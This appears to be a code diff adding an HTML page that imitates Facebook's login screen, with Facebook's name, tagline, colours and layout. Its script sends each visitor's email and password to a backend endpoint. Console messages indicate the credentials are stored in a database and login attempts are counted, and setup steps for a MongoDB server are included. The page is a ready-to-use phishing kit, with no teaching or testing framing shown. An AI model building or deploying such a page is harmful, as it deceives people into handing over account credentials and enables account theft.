@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log In</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            background: white;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            display: flex;
+            max-width: 980px;
+            width: 100%;
+            margin: 0 20px;
+            gap: 50px;
+            align-items: center;
+        }
+
+        .left-section {
+            flex: 1;
+            color: #1877f2;
+        }
+
+        .logo {
+            font-size: 56px;
+            font-weight: bold;
+            margin-bottom: 16px;
+            text-shadow: none;
+        }
+
+        .tagline {
+            font-size: 28px;
+            font-weight: normal;
+            line-height: 1.2;
+            text-shadow: none;
+            color: #606770;
+        }
+
+        .login-box {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 8px 28px rgba(0,0,0,0.2);
+            padding: 24px;
+            width: 396px;
+            flex-shrink: 0;
+        }
+
+        .login-form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .input-field {
+            background: #f5f6f7;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            color: #1d2129;
+            font-size: 17px;
+            line-height: 16px;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            width: 100%;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .input-field:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+        }
+
+        .login-btn {
+            background: #1877f2;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 20px;
+            font-weight: bold;
+            line-height: 48px;
+            margin-bottom: 16px;
+            padding: 0 16px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .login-btn:hover {
+            background: #166fe5;
+        }
+
+        .forgot-password {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+            text-align: center;
+            margin-bottom: 20px;
+            display: block;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            border-top: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+
+        .create-account-btn {
+            background: #42b883;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 17px;
+            font-weight: bold;
+            line-height: 48px;
+            padding: 0 16px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            align-self: center;
+        }
+
+        .create-account-btn:hover {
+            background: #369870;
+        }
+
+        .status-message {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 4px;
+            text-align: center;
+            display: none;
+        }
+
+        .success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+
+        .error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+
+        @media (max-width: 1024px) {
+            .container {
+                max-width: 90%;
+                gap: 30px;
+            }
+            
+            .logo {
+                font-size: 48px;
+            }
+            
+            .tagline {
+                font-size: 24px;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                flex-direction: column;
+                text-align: center;
+                gap: 30px;
+                max-width: 100%;
+            }
+
+            .left-section {
+                order: 2;
+            }
+
+            .login-box {
+                order: 1;
+                width: 100%;
+                max-width: 400px;
+                margin: 0 auto;
+            }
+
+            .logo {
+                font-size: 40px;
+            }
+
+            .tagline {
+                font-size: 20px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            body {
+                padding: 10px;
+            }
+            
+            .container {
+                gap: 20px;
+            }
+            
+            .login-box {
+                padding: 20px;
+                max-width: 100%;
+            }
+            
+            .logo {
+                font-size: 32px;
+            }
+            
+            .tagline {
+                font-size: 18px;
+            }
+            
+            .input-field {
+                font-size: 16px;
+                padding: 12px 14px;
+            }
+            
+            .login-btn {
+                font-size: 18px;
+                line-height: 44px;
+            }
+            
+            .create-account-btn {
+                font-size: 16px;
+                line-height: 44px;
+            }
+        }
+
+        @media (max-width: 360px) {
+            .login-box {
+                padding: 16px;
+            }
+            
+            .logo {
+                font-size: 28px;
+            }
+            
+            .tagline {
+                font-size: 16px;
+            }
+            
+            .input-field {
+                font-size: 15px;
+                padding: 10px 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="left-section">
+            <h1 class="logo">Facebook</h1>
+            <p class="tagline">Connect with friends and the world around you on Facebook.</p>
+        </div>
+        
+        <div class="login-box">
+            <form class="login-form" id="loginForm">
+                <input type="text" class="input-field" id="email" placeholder="Email or phone number" required>
+                <input type="password" class="input-field" id="password" placeholder="Password" required>
+                <button type="submit" class="login-btn">Log In</button>
+                <a href="#" class="forgot-password">Forgot password?</a>
+                
+                <div class="divider"></div>
+                
+                <button type="button" class="create-account-btn">Create New Account</button>
+                
+                <div class="status-message" id="statusMessage"></div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const loginBtn = document.querySelector('.login-btn');
+            
+            if (!email || !password) {
+                showMessage('Please fill in all fields', 'error');
+                return;
+            }
+            
+            // Disable button and show loading
+            loginBtn.textContent = 'Logging in...';
+            loginBtn.disabled = true;
+            
+            try {
+                // Send login data to backend
+                const response = await fetch('/api/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        email: email,
+                        password: password
+                    })
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    showMessage('✅ Login successful!', 'success');
+                    console.log('Login saved with ID:', result.data.id);
+                    console.log('Timestamp:', result.data.timestamp);
+                    
+                    // Clear form after successful login
+                    document.getElementById('loginForm').reset();
+                } else {
+                    showMessage('❌ ' + result.message, 'error');
+                }
+                
+            } catch (error) {
+                console.error('Login error:', error);
+                showMessage('❌ Connection error. Please check if the server is running.', 'error');
+            } finally {
+                // Re-enable button
+                loginBtn.textContent = 'Log In';
+                loginBtn.disabled = false;
+            }
+        });
+        
+        function showMessage(message, type) {
+            const statusDiv = document.getElementById('statusMessage');
+            statusDiv.innerHTML = message;
+            statusDiv.className = 'status-message ' + type;
+            statusDiv.style.display = 'block';
+            
+            // Hide message after 5 seconds
+            setTimeout(() => {
+                statusDiv.style.display = 'none';
+            }, 5000);
+        }
+        
+
+
+        // Check server connection on page load
+        window.addEventListener('load', async function() {
+            try {
+                const response = await fetch('/api/login-attempts');
+                const result = await response.json();
+                if (result.success) {
+                    console.log('🔗 Connected to backend successfully');
+                    console.log(`📊 Total login attempts in database: ${result.count}`);
+                }
+            } catch (error) {
+                console.warn('⚠️ Backend connection failed. Make sure server is running on port 3000');
+                console.log('To start the backend:');
+                console.log('1. npm install');
+                console.log('2. Make sure MongoDB is running');
+                console.log('3. npm start');
+            }
+        });
+    </script>
+</body>
+</html>
